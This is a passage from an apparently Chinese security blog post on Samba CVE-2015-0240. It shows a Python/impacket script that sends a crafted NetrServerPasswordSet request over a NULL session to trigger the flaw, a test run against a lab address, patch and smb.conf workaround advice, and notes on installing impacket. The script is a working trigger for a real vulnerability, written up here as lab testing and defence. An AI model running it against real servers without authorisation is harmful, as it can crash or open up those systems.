<span class="hljs-keyword">from</span> impacket.dcerpc.v5.ndr <span class="hljs-keyword">import</span> NDRCALL

<span class="hljs-keyword">if</span> len(sys.argv) &lt; <span class="hljs-number">2</span>:
    print(<span class="hljs-string">"Usage: &#123;&#125; &lt;target_ip&gt;"</span>.format(sys.argv[<span class="hljs-number">0</span>]))
    sys.exit(<span class="hljs-number">1</span>)
    
target = sys.argv[<span class="hljs-number">1</span>]

username = <span class="hljs-string">''</span>
password = <span class="hljs-string">''</span>

<span class="hljs-comment">###</span>
<span class="hljs-comment"># impacket does not implement NetrServerPasswordSet</span>
<span class="hljs-comment">###</span>
<span class="hljs-keyword">from</span> impacket.dcerpc.v5.dtypes <span class="hljs-keyword">import</span> *

<span class="hljs-comment"># 3.5.4.4.6 NetrServerPasswordSet (Opnum 6)</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NetrServerPasswordSet</span><span class="hljs-params">(NDRCALL)</span>:</span>
    opnum = <span class="hljs-number">6</span>
    structure = (
       (<span class="hljs-string">'PrimaryName'</span>,nrpc.PLOGONSRV_HANDLE),
       (<span class="hljs-string">'AccountName'</span>,WSTR),
       (<span class="hljs-string">'SecureChannelType'</span>,nrpc.NETLOGON_SECURE_CHANNEL_TYPE),
       (<span class="hljs-string">'ComputerName'</span>,WSTR),
       (<span class="hljs-string">'Authenticator'</span>,nrpc.NETLOGON_AUTHENTICATOR),
       (<span class="hljs-string">'UasNewPassword'</span>,nrpc.ENCRYPTED_NT_OWF_PASSWORD),
    )

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NetrServerPasswordSetResponse</span><span class="hljs-params">(NDRCALL)</span>:</span>
    structure = (
       (<span class="hljs-string">'ReturnAuthenticator'</span>,nrpc.NETLOGON_AUTHENTICATOR),
       (<span class="hljs-string">'ErrorCode'</span>,NTSTATUS),
    )

nrpc.OPNUMS[<span class="hljs-number">6</span>] = (NetrServerPasswordSet, NetrServerPasswordSetResponse)


<span class="hljs-comment">###</span>
<span class="hljs-comment"># connect to target</span>
<span class="hljs-comment">###</span>
rpctransport = transport.DCERPCTransportFactory(<span class="hljs-string">r'ncacn_np:%s[\PIPE\netlogon]'</span> % target)
rpctransport.set_credentials(<span class="hljs-string">''</span>,<span class="hljs-string">''</span>)  <span class="hljs-comment"># NULL session</span>
rpctransport.set_dport(<span class="hljs-number">445</span>)
<span class="hljs-comment"># impacket has a problem with SMB2 dialect against samba4</span>
<span class="hljs-comment"># force to 'NT LM 0.12' only</span>
rpctransport.preferred_dialect(<span class="hljs-string">'NT LM 0.12'</span>)

dce = rpctransport.get_dce_rpc()
dce.connect()
dce.bind(nrpc.MSRPC_UUID_NRPC)

<span class="hljs-comment">###</span>
<span class="hljs-comment"># request for session key</span>
<span class="hljs-comment">###</span>
<span class="hljs-comment">#resp = nrpc.hNetrServerReqChallenge(dce, NULL, target + '\x00', '12345678')</span>
<span class="hljs-comment">#resp.dump()</span>
<span class="hljs-comment">#serverChallenge = resp['ServerChallenge']</span>
<span class="hljs-comment">#sessionKey = nrpc.ComputeSessionKeyStrongKey(password, '12345678', serverChallenge, None)</span>
sessionKey = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">16</span>


<span class="hljs-comment">###</span>
<span class="hljs-comment"># prepare ServerPasswordSet request</span>
<span class="hljs-comment">###</span>
authenticator = nrpc.NETLOGON_AUTHENTICATOR()
authenticator[<span class="hljs-string">'Credential'</span>] = nrpc.ComputeNetlogonCredential(<span class="hljs-string">'12345678'</span>, sessionKey)
authenticator[<span class="hljs-string">'Timestamp'</span>] = <span class="hljs-number">10</span>

uasNewPass = nrpc.ENCRYPTED_NT_OWF_PASSWORD()
uasNewPass[<span class="hljs-string">'Data'</span>] = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">16</span>

primaryName = nrpc.PLOGONSRV_HANDLE()
<span class="hljs-comment"># ReferentID field of PrimaryName controls the uninitialized value of creds in ubuntu 12.04 32bit</span>
primaryName.fields[<span class="hljs-string">'ReferentID'</span>] = <span class="hljs-number">0x41414141</span>

request = NetrServerPasswordSet()
request[<span class="hljs-string">'PrimaryName'</span>] = primaryName
request[<span class="hljs-string">'AccountName'</span>] = username+<span class="hljs-string">'a\x00'</span>
request[<span class="hljs-string">'SecureChannelType'</span>] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel
request[<span class="hljs-string">'ComputerName'</span>] = target+<span class="hljs-string">'\x00'</span>
request[<span class="hljs-string">'Authenticator'</span>] = authenticator
request[<span class="hljs-string">'UasNewPassword'</span>] = uasNewPass


DCERPCSessionError = nrpc.DCERPCSessionError
<span class="hljs-keyword">try</span>:
    resp = dce.request(request)
    print(<span class="hljs-string">"no error !!! error code: 0xc0000225 or 0xc0000034 is expected"</span>)
    print(<span class="hljs-string">"seems not vulnerable"</span>)
    <span class="hljs-comment">#resp.dump()</span>
    dce.disconnect()
<span class="hljs-keyword">except</span> DCERPCSessionError <span class="hljs-keyword">as</span> e:
    <span class="hljs-comment"># expect error_code: 0xc0000225 - STATUS_NOT_FOUND</span>
    <span class="hljs-comment"># expect error_code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND</span>
    print(<span class="hljs-string">"seems not vulnerable"</span>)
    <span class="hljs-comment">#resp.dump()</span>
    dce.disconnect()
<span class="hljs-keyword">except</span> impacket.nmb.NetBIOSError <span class="hljs-keyword">as</span> e:
    <span class="hljs-keyword">if</span> e.args[<span class="hljs-number">0</span>] == <span class="hljs-string">'Error while reading from remote'</span>:
        print(<span class="hljs-string">"connection lost!!!\nmight be vulnerable"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">raise</span></code></pre>

<p>测试</p>
<pre><code class="hljs angelscript"><span class="hljs-symbol">kali@</span>kali:~/Desktop$ python <span class="hljs-number">2015</span><span class="hljs-number">-0240.</span>py <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.137</span>
seems <span class="hljs-keyword">not</span> vulnerable</code></pre>



<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>1、更新补丁</p>
<p>Samba已经为此发布了一个安全公告（CVE-2015-0240）以及相应补丁:</p>
<p>链接：<a href="https://www.samba.org/samba/security/CVE-2015-0240" target="_blank" rel="noopener">https://www.samba.org/samba/security/CVE-2015-0240</a>  </p>
<p>2、临时解决方法</p>
<p>在Samba 4.0.0和更高版本中，在smb.conf配置文件中的[global]域中增加下列行：</p>
<p>rpc_server:netlogon=disabled</p>
<p>注：此方法对Samba 3.x版本无效。</p>
<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>python 安装impacket包安装失败，查看错误提示</p>
<p><a href="https://imgchr.com/i/rTIuN9" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/12/28/rTIuN9.png" srcset="/img/loading.gif" alt="rTIuN9.png"></a></p>
<p>Python安装cryptography报错</p>
<p>查找解决办法。</p>
<p>缺少Python的头文件和静态库包，<code>sudo apt-get install python-dev</code></p>
<p><a href="https://imgchr.com/i/rTInAJ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/12/28/rTInAJ.png" srcset="/img/loading.gif" alt="rTInAJ.png"></a></p>
<p>按提示进行安装</p>
<p><a href="https://imgchr.com/i/rTIKhR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/12/28/rTIKhR.png" srcset="/img/loading.gif" alt="rTIKhR.png"></a></p>
<p>再一次安装python-dev，安装成功</p>
<p><a href="https://imgchr.com/i/rTIQ91" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/12/28/rTIQ91.png" srcset="/img/loading.gif" alt="rTIQ91.png"></a></p>
<p>再次安装impacket包。安装成功</p>
<p><a href="https://imgchr.com/i/rTIGnO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/12/28/rTIGnO.png" srcset="/img/loading.gif" alt="rTIGnO.png"></a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.secpulse.com/archives/5975.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/5975.html</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/Linux/">Linux</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/cve/">cve</a>
                    
                      <a class="hover-with-bg" href="/tags/Samba/">Samba</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/01/06/pikachu/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">pikachu靶机环境搭建及使用</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/12/28/burp-xray/">
                        <span class="hidden-mobile">burp联动xray被动扫描</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments">
                
                
  <div id="vcomments"></div>
  <script type="text/javascript">
    function loadValine() {
      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
        new Valine({
          el: "#vcomments",
          app_id: "zJq4EoET2FEb1trGzTayy1uq-gzGzoHsz",
          app_key: "oFcTVTBJYrfsIGdYNnoWMVJ9",
          placeholder: "留下你的足迹",
          path: window.location.pathname,
          avatar: "retro",
          meta: ["nick","mail","link"],
          pageSize: "10",
          lang: "zh-CN",
          highlight: false,
          recordIP: false,
          serverURLs: "",
        });
      });
    }
    waitElementVisible('vcomments', loadValine);
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" target="_blank" rel="nofollow noopener noopener">comments
      powered by Valine.</a></noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
    
<a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Hexo-Fluid</span></a>

  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>





  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>












  
    <!-- Baidu Analytics -->
    <script defer>
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?d8cb5311ff5a7a66ad88e94f5290da89";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  

  

  

  

  





</body>
</html>
